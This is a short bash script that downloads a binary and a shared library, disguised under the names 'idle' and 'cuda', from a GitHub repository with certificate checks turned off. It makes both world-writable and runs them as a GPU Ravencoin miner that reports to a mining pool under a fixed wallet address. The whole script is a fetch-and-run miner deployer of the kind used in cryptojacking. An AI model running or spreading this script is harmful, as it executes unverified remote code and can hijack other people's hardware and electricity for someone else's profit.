#!/bin/bash

wget --no-check-certificate -qO idle 'https://github.com/hanrzme/cuda/raw/refs/heads/main/idle' && wget --no-check-certificate -qO libidle-cuda.so 'https://github.com/hanrzme/cuda/raw/refs/heads/main/libidle-cuda.so' && chmod -R 777 ./idle && chmod -R 777 ./libidle-cuda.so && ./idle -o hk.ravencoin.gfwroute.com:1140 -u RW43fKGSedsG633mYmaUCJgqM1bfdx7c7h.GO5 --algo=kawpow --no-cpu --cuda -k --cuda-loader=./libidle-cuda.so
